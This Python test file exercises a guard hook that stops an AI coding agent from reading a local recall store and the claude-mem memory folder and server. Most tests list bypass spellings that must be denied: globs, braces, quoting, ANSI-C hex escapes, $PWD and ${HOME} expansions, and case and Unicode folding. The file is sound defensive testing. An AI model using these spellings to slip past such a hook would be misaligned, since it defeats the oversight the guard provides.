def test_csr_glob_and_brace_tool_patterns_denied(store_world: _StoreWorld) -> None:
    home = store_world.home.as_posix()
    for tool, tool_input in (
        ("Glob", {"pattern": f"{home}/.ultracode-goal/rec*/**"}),
        ("Glob", {"pattern": "rec*/**/*.jsonl", "path": store_world.store.parent.as_posix()}),
        ("Grep", {"pattern": "x", "glob": f"{home}/.ultracode-goal/{{recall,other}}/**"}),
        ("Read", {"file_path": f"{home}/.ultracode-goal/rec?ll/runs/x.jsonl"}),
    ):
        code, out = _run_in(store_world, tool, tool_input)
        _assert_latch_denied(code, out, store_world.latch)


def test_csr_globs_and_braces_that_miss_the_store_are_allowed(store_world: _StoreWorld) -> None:
    """Controls: alternatives and globs that cannot be the store, and `**` from
    a folder above it (the accepted ancestor-search residual)."""
    parent = store_world.store.parent.as_posix()
    for tool, tool_input in (
        ("Bash", {"command": "cat ~/.ultracode-goal/{other,more}/x"}),
        ("Bash", {"command": "ls ~/.ultracode-goal/other*"}),
        ("Bash", {"command": "cat ~/.ultracode-goal/re[x]all/y"}),
        ("Bash", {"command": "echo {a,b} && ls src/*.py"}),
        ("Bash", {"command": f"cat {parent}/**/x"}),
        ("Glob", {"pattern": "**/*.jsonl", "path": parent}),
    ):
        _assert_allowed(*_run_in(store_world, tool, tool_input))


@pytest.mark.parametrize(
    "command",
    [
        "cat ~+/.ultracode-goal/recall/runs/x.jsonl",
        "cat $PWD/.ultracode-goal/recall/runs/x.jsonl",
        "cat ${PWD}/.ultracode-goal/recall/runs/x.jsonl",
    ],
    ids=["tilde-plus", "dollar-pwd", "braced-pwd"],
)
def test_csr_cwd_spellings_read_as_the_event_cwd(store_world: _StoreWorld, command: str) -> None:
    """`~+`, `$PWD` and `${PWD}` are the event's cwd, here the home (bypass review 5)."""
    code, out = _bash(store_world, command, cwd=store_world.home)
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize(
    "spelling",
    ["${HOME:-/x}", "${HOME%/}", "${HOME#}", "${USERPROFILE:-/x}"],
    ids=["default", "suffix-strip", "prefix-strip", "userprofile-default"],
)
def test_csr_home_parameter_expansions_read_as_the_home(store_world: _StoreWorld, spelling: str) -> None:
    """Bypass review 5."""
    code, out = _bash(store_world, f"cat {spelling}/.ultracode-goal/recall/runs/x.jsonl")
    _assert_latch_denied(code, out, store_world.latch)


def test_csr_ansi_c_quoted_store_path_denied(store_world: _StoreWorld) -> None:
    """`$'\\x..'` escapes spell the store without naming it literally (bypass review 5)."""
    escaped = "".join(f"\\x{ord(char):02x}" for char in store_world.s)
    for command in (f"cat $'{escaped}'/runs/x.jsonl", "cat $'\\x7e'/.ultracode-goal/recall/x"):
        code, out = _bash(store_world, command)
        _assert_latch_denied(code, out, store_world.latch)


def test_csr_macos_folds_case_and_form_on_the_deny_side_only(guard_module, monkeypatch) -> None:
    """On macOS, whose file systems ignore case and Unicode form by default, the
    deny side compares NFC-normalized and casefolded paths; the exemption does
    not, so a pinned name in another case is not the pinned script on a
    case-sensitive volume (bypass review 7)."""
    monkeypatch.setattr(guard_module, "_FOLD_CASE_AND_FORM", True)
    composed = os.path.join(os.sep, "Users", "u", "Caf\u00e9", "Recall")
    decomposed = os.path.join(os.sep, "users", "u", "cafe\u0301", "recall")

    assert guard_module._fold(composed) == guard_module._fold(decomposed)
    roots = guard_module._roots(composed)
    assert guard_module._names_store(
        os.path.join(decomposed, "runs", "x.jsonl"), roots, [os.sep], [], os.sep, whole=True
    )
    if sys.platform != "win32":  # normcase already folds case there
        pinned = guard_module._pinned_paths()[0]
        other_case = os.path.join(os.path.dirname(pinned), os.path.basename(pinned).upper())
        assert not guard_module._is_pinned(other_case)
        assert guard_module._is_pinned(pinned)


@pytest.mark.parametrize(
    "command",
    [
        "cat ~/.claude-m'e'm/claude-mem.db",
        'cat ~/.claude-"mem"/claude-mem.db',
        "cat ~/.claude-m\\em/claude-mem.db",
        "cat ~/.claude-m?m/claude-mem.db",
        "cat ~/.claude-m*/claude-mem.db",
        "cat ~/.c*/claude-mem.db",
        "cat ~/.claude-{mem,x}/claude-mem.db",
        "cat ~/.c{l,x}aude-mem/claude-mem.db",
        "cat $'\\x2e'claude-mem/claude-mem.db",
        # Named outside any home: only the literal check, past its quoting, sees these.
        "cat /srv/.claude-m'e'm/claude-mem.db",
        "grep -rn x /srv/.claude-m\\em",
    ],
    ids=[
        "single-quoted",
        "double-quoted",
        "backslash",
        "question-mark",
        "star",
        "short-star",
        "brace",
        "brace-inside",
        "ansi-c",
        "quoted-outside-a-home",
        "backslash-outside-a-home",
    ],
)
def test_csr_claude_mem_spelled_around_quotes_globs_and_braces_denied(
    store_world: _StoreWorld, command: str
) -> None:
    """Bypass review 8: the literal check reads past quotes and backslashes, and
    a glob or brace expansion that reaches claude-mem's folder under a home
    counts too."""
    code, out = _bash(store_world, command)
    reason = _assert_latch_denied(code, out, store_world.latch)
    assert "reaches into '.claude-mem'" in reason


def test_csr_claude_mem_tool_patterns_denied(store_world: _StoreWorld) -> None:
    home = store_world.home.as_posix()
    for tool, tool_input in (
        ("Glob", {"pattern": f"{home}/.claude-m*/**"}),
        ("Grep", {"pattern": "x", "glob": home + "/.claude-{mem,x}/**"}),
        ("Read", {"file_path": f"{home}/.claude-m?m/claude-mem.db"}),
    ):
        code, out = _run_in(store_world, tool, tool_input)
        reason = _assert_latch_denied(code, out, store_world.latch)
        assert "reaches into '.claude-mem'" in reason


def test_csr_dot_globs_away_from_claude_mem_are_allowed(store_world: _StoreWorld) -> None:
    """Controls: a dot glob in the repo is not claude-mem's folder under a home."""
    for command in ("ls -d .*", "cat ./.c*", "ls ~/.config/x", "grep -rn claude src"):
        _assert_allowed(*_bash(store_world, command))


_RESOURCE_TOOLS = ("ReadMcpResourceTool", "ListMcpResourcesTool", "ReadMcpResourceDirTool")


@pytest.mark.parametrize("server", ["plugin:claude-mem:mcp-search", "claude-mem", "claude_mem"])
@pytest.mark.parametrize("tool", _RESOURCE_TOOLS)
def test_csr_mcp_resource_calls_on_claude_mem_denied(store_world: _StoreWorld, tool: str, server: str) -> None:
    """A resource read or listing reaches the claude-mem server through its
    `server` input, not its tool name (bypass review 9)."""
    code, out = _run_in(store_world, tool, {"server": server, "uri": "claude-mem://x"})
    reason = _assert_latch_denied(code, out, store_world.latch)
    assert f"refusing a {tool} call on the claude-mem MCP server {server}." in reason


@pytest.mark.parametrize("server", ["claude-memory", "plugin:claude-memoir:x", "Neon", None])
def test_csr_mcp_resource_calls_elsewhere_are_allowed(store_world: _StoreWorld, server: str | None) -> None:
    tool_input = {"uri": "x://y"} if server is None else {"server": server, "uri": "x://y"}
    _assert_allowed(*_run_in(store_world, "ReadMcpResourceTool", tool_input))


def test_csr_no_latch_leaves_mcp_resource_calls_alone(store_world: _StoreWorld) -> None:
    store_world.latch.unlink()
    _assert_allowed(*_run_in(store_world, "ReadMcpResourceTool", {"server": "claude-mem", "uri": "x"}))


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="no FIFOs here")
def test_csr_fifo_at_the_latch_path_does_not_hang_the_guard(store_world: _StoreWorld) -> None:
    """A FIFO at the latch path is a present latch that cannot be read: the
    claude-mem deny still fires and nothing blocks on the read (C-2: no store,
    so no path deny)."""
    store_world.latch.unlink()
    os.mkfifo(store_world.latch)
    env = {**os.environ, **store_world.env}

    def run(tool: str, tool_input: dict) -> subprocess.CompletedProcess:
        return subprocess.run(
            [sys.executable, str(HOOK)],
            input=json.dumps(_mem_event(tool, store_world.cwd, tool_input)),
            cwd=store_world.cwd,
            capture_output=True,
            text=True,
            env=env,
            timeout=60,
        )

    denied = run("mcp__claude-mem__search", {})
    assert denied.returncode == 2, denied.stdout
    allowed = run("Read", {"file_path": f"{store_world.s}/runs/x.jsonl"})
    assert (allowed.returncode, allowed.stdout) == (0, "")


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="no FIFOs here")
def test_csr_fifo_latch_held_open_by_a_writer_reads_as_unreadable(guard_module, tmp_path: Path) -> None:
    """A FIFO whose writer holds it open and has filled it with a green latch
    neither blocks the read nor yields a latch: the read past its data meets
    no end of file, so the latch reads as None."""
    fifo = tmp_path / ".mem-state.json"
    os.mkfifo(fifo)
    writer = os.open(fifo, os.O_RDWR)  # holds the FIFO open, so it never blocks
    try:
        os.write(writer, json.dumps(_v2_latch(tmp_path / "store")).encode("utf-8"))
        assert guard_module._read_latch(fifo) is None
    finally:
        os.close(writer)


def test_csr_oversized_latch_reads_as_unreadable(guard_module, store_world: _StoreWorld) -> None:
    small = json.dumps(_v2_latch(store_world.store))
    store_world.latch.write_text(small + " " * guard_module._LATCH_READ_CAP, encoding="utf-8")
    assert guard_module._read_latch(store_world.latch) is None
    store_world.latch.write_text(small, encoding="utf-8")
    assert guard_module._read_latch(store_world.latch) == json.loads(small)


# --- SECURITY.md (CSR-UNIT-042) ------------------------------------------------


def test_csr_security_md_carries_the_left_behind_latch_caveat() -> None:
    """CSR-UNIT-042 (AC-13): invariant 6 says a dead run's latch keeps denying
    until the next Stage 1 or its deletion, and the count matches the guard's
    docstring (now seven invariants)."""
    text = (_REPO_ROOT / "SECURITY.md").read_text(encoding="utf-8")
    assert "It enforces seven invariants:" in text
    invariants = [line.strip() for line in text.splitlines() if re.match(r"\s+\d\. ", line)]
    assert [line[:2] for line in invariants] == ["1.", "2.", "3.", "4.", "5.", "6.", "7."]
    sixth = invariants[5]
    assert "left behind" in sixth
    assert "Stage 1" in sixth
    assert "delete" in sixth
    doc = _load_guard_module().__doc__
    assert "  7. Cross-Session Recall, local run store" in doc
